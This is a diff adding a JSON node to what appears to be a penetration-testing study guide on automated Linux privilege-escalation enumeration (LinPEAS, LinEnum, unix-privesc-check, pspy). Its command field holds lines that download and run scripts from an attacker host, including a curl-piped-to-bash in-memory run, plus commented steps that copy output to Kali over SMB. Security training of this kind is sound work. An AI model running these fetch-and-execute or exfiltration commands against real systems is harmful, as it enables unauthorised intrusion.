@@ -1,0 +1,34 @@
+{
+  "id": "linpeas",
+  "phase": "LINUX",
+  "title": "LinPEAS + Automated Linux Enum",
+  "body": "Module 18.1.3: run automated tools first for speed, but they miss custom configs. Always supplement with manual enum. LinPEAS color codes: RED = high priority, YELLOW = interesting.",
+  "cmd": "# ── LINPEAS ───────────────────────────────────────────\n# On Kali:\n# cp /usr/share/peass/linpeas/linpeas.sh .\n# python3 -m http.server 80\n\n# Transfer and run (save output)\nwget http://$lhost/linpeas.sh -O /tmp/lp.sh\nchmod +x /tmp/lp.sh\n/tmp/lp.sh | tee /tmp/linpeas_out.txt\n\n# Or run in memory (no disk touch)\ncurl http://$lhost/linpeas.sh | bash\n\n# If /tmp is noexec:\ncd /dev/shm && wget http://$lhost/linpeas.sh -O lp.sh && chmod +x lp.sh && ./lp.sh\n\n# Exfil output to Kali\n# impacket-smbserver -smb2support kali . -username user -password pass\n# On target:\n# mount.cifs //$lhost/kali /mnt -o username=user,password=pass\n# cp /tmp/linpeas_out.txt /mnt/\n\n# ── LINENUM ───────────────────────────────────────────\nwget http://$lhost/LinEnum.sh -O /tmp/le.sh\nchmod +x /tmp/le.sh && /tmp/le.sh\n\n# ── UNIX-PRIVESC-CHECK (pre-installed on Kali) ────────\n# Already on Kali: /usr/bin/unix-privesc-check\n# Transfer to target:\nscp /usr/bin/unix-privesc-check user@$ip:/tmp/\n./unix-privesc-check standard > /tmp/output.txt\n./unix-privesc-check detailed > /tmp/output_detailed.txt\ncat /tmp/output.txt | grep -i \"WARNING\"\n\n# ── PSPY — WATCH PROCESSES WITHOUT ROOT ───────────────\n# Download: github.com/DominicBreuker/pspy\nwget http://$lhost/pspy64 -O /tmp/pspy64\nchmod +x /tmp/pspy64\n/tmp/pspy64\n# Watch for cron jobs running as root (UID=0)\n# Ctrl+C to stop\n\n# ── LINPEAS COLOR GUIDE ───────────────────────────────\n# RED/YELLOW  = 95%+ chance of privesc vector\n# GREEN       = good for the attacker (interesting config)\n# Focus areas in order:\n# 1. Sudo version + CVEs\n# 2. SUID binaries\n# 3. Cron jobs\n# 4. Writable files owned by root\n# 5. Services running as root\n# 6. Password files / history\n# 7. Network services on loopback",
+  "warn": "LinPEAS misses custom one-off configs — the thing that gets you root is often not in the automated output. Always check bash history, env vars, and cron scripts manually.",
+  "choices": [
+    {
+      "label": "Sudo misconfiguration found",
+      "next": "sudo_check"
+    },
+    {
+      "label": "SUID binary found",
+      "next": "suid_check"
+    },
+    {
+      "label": "Cron job writable",
+      "next": "cron_check"
+    },
+    {
+      "label": "Creds in history/env",
+      "next": "linux_password_hunt"
+    },
+    {
+      "label": "Kernel exploit path",
+      "next": "kernel_exploit"
+    },
+    {
+      "label": "Interesting group (docker/lxd/disk)",
+      "next": "linux_privesc_extra"
+    }
+  ]
+}
